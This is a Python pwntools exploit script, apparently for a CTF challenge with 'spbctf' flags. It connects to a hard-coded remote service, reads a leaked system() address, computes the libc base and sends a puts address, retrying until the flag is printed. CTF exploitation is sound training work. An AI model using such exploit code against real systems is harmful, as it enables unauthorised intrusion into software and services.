#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./mib')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11624)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
while True:
    io = start(stdin=PTY) # becouse read(stdout, &buf, 8)
    libc = ELF('libc.so.6')
    io.recvuntil("system: ")
    system_ptr = int(io.recvline()[:-1], 16)
    libc.address = system_ptr - libc.symbols["system"]
    # io.recvuntil("Your last words:")
    io.send(p64(libc.sym["puts"]))

    try:
        io.recvuntil("spbctf")
        flag = io.recvuntil("}").decode()
        log.success(f"Flag: spbctf{flag}")
        io.close()
        break
    except EOFError:
        log.info("Trying one more time...")

